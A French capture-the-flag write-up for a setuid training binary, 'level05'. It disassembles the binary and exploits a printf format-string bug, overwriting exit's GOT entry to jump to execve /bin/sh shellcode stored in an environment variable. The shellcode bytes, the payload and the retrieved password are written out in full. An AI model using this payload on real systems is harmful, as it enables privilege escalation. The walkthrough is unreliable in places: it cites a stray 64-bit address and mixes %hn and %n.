# level05

```bash
$ ls -l
total 8
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
$ file level05
level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
$ gdb -q ./level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     push   %edi
   0x08048448 <+4>:     push   %ebx
   0x08048449 <+5>:     and    $0xfffffff0,%esp
   0x0804844c <+8>:     sub    $0x90,%esp
   0x08048452 <+14>:    movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:    mov    0x80497f0,%eax
   0x08048462 <+30>:    mov    %eax,0x8(%esp)
   0x08048466 <+34>:    movl   $0x64,0x4(%esp)
   0x0804846e <+42>:    lea    0x28(%esp),%eax
   0x08048472 <+46>:    mov    %eax,(%esp)
   0x08048475 <+49>:    call   0x8048350 <fgets@plt>
   0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:    jmp    0x80484d3 <main+143>
   0x08048487 <+67>:    lea    0x28(%esp),%eax
   0x0804848b <+71>:    add    0x8c(%esp),%eax
   0x08048492 <+78>:    movzbl (%eax),%eax
   0x08048495 <+81>:    cmp    $0x40,%al
   0x08048497 <+83>:    jle    0x80484cb <main+135>
   0x08048499 <+85>:    lea    0x28(%esp),%eax
   0x0804849d <+89>:    add    0x8c(%esp),%eax
   0x080484a4 <+96>:    movzbl (%eax),%eax
   0x080484a7 <+99>:    cmp    $0x5a,%al
   0x080484a9 <+101>:   jg     0x80484cb <main+135>
   0x080484ab <+103>:   lea    0x28(%esp),%eax
   0x080484af <+107>:   add    0x8c(%esp),%eax
   0x080484b6 <+114>:   movzbl (%eax),%eax
   0x080484b9 <+117>:   mov    %eax,%edx
   0x080484bb <+119>:   xor    $0x20,%edx
   0x080484be <+122>:   lea    0x28(%esp),%eax
   0x080484c2 <+126>:   add    0x8c(%esp),%eax
   0x080484c9 <+133>:   mov    %dl,(%eax)
   0x080484cb <+135>:   addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
   0x080484da <+150>:   lea    0x28(%esp),%eax
   0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:   mov    %eax,%edx
   0x080484e8 <+164>:   mov    $0x0,%eax
   0x080484ed <+169>:   mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:   mov    %edx,%edi
   0x080484f3 <+175>:   repnz scas %es:(%edi),%al
   0x080484f5 <+177>:   mov    %ecx,%eax
   0x080484f7 <+179>:   not    %eax
   0x080484f9 <+181>:   sub    $0x1,%eax
   0x080484fc <+184>:   cmp    %eax,%ebx
   0x080484fe <+186>:   jb     0x8048487 <main+67>
   0x08048500 <+188>:   lea    0x28(%esp),%eax
   0x08048504 <+192>:   mov    %eax,(%esp)
   0x08048507 <+195>:   call   0x8048340 <printf@plt>
   0x0804850c <+200>:   movl   $0x0,(%esp)
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
End of assembler dump.
```

```bash
# Decompile main
void main(void)
{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  byte bVar4;
  byte local_78 [100];
  uint local_14;

  bVar4 = 0;
  local_14 = 0;
  fgets((char *)local_78,100,stdin); # buffer overflow
  local_14 = 0;
  do {
    uVar2 = 0xffffffff;
    pbVar3 = local_78;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      bVar1 = *pbVar3;
      pbVar3 = pbVar3 + (uint)bVar4 * -2 + 1;
    } while (bVar1 != 0);
    if (~uVar2 - 1 <= local_14) {
      printf((char *)local_78); # format string vulnerable
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (('@' < (char)local_78[local_14]) && ((char)local_78[local_14] < '[')) {
      local_78[local_14] = local_78[local_14] ^ 0x20; # to lowercase
    }
    local_14 = local_14 + 1;
  } while( true );
}
```

Le but va etre de remplacer l’adresse d’exit dans la `GOT` par l’adresse de notre `shellcode` afin qu’il soit exécuté.

```bash
$ gdb -q ./level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
$ export SHELLCODE=`python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'`
$ env -i  SHELLCODE=`python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'` gdb -q ./level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048449 in main ()
(gdb) x/200s environ
...
0xffffdbd4:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdc9c:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdd64:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde2c:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdef4:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdfbc:      "\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
...
# par exemple 0xffffdd64
```

Nous avons l’adresse de `exit` dans la `GOT` : `0x80497e0` et l’adresse de notre `shellcode` depuis l’env: `0xffffdd64`

Nous devons

Nous devons écrire l'adresse du shellcode (0x7fffffffe89f) dans l'emplacement de `exit`. Cela nécessite de découper l'adresse en deux parties pour pouvoir l'écrire via deux opérations `%n` :

- **Basse partie** : `0xdd64`(les deux derniers octets)
- **Haute partie** : `0xffff` (les deux premiers octets)

```bash
$ ./level05
%x %x %x %x %x %x %x %x %x %x
64 f7fcfac0 0 0 0 0 ffffffff ffffd704 f7fdb000 25207825
# index `%10$hn` pour la partie basse
# index `%11$hn` pour la partie haute
```

### **Calcul du padding** :

Maintenant, nous devons calculer combien de caractères il faut imprimer avant d'utiliser les spécificateurs `%n` pour écrire les valeurs correctes dans la mémoire.

- **Première étape** : Ecrire `0xdd64`à `0x080497e0`.
    - La quantité de caractères imprimés jusque-là doit être `0xdd64`(ou 56676 en décimal).
    - Le nombre total de caractères à imprimer avant d'utiliser `%n` est de `56676`.
    - Cependant, nous devons prendre en compte la longueur des adresses déjà imprimées (8 octets = 8 caractères). Donc, le premier padding sera `56676 - 8 = 56668`.
- **Deuxième étape** : Ecrire `0xffff`à `0x080497e2`.
    - Nous avons déjà imprimé `56668` caractères pour la première écriture.
    - Pour atteindre `0xffff`(ou 65535 en décimal), nous devons ajouter un padding supplémentaire.
    - La différence sera calculée comme suit : `0xffff- 0xdd64 = 65535 - 56676 = 8859`.

```bash
$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56668d%10$n" + "%8859d%11$n"' > /tmp/payload.txt
$ cat /tmp/payload.txt - | env -i SHELLCODE=`python -c 'print "\x90" * 1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'` ./level05
...
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

FLAG: `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`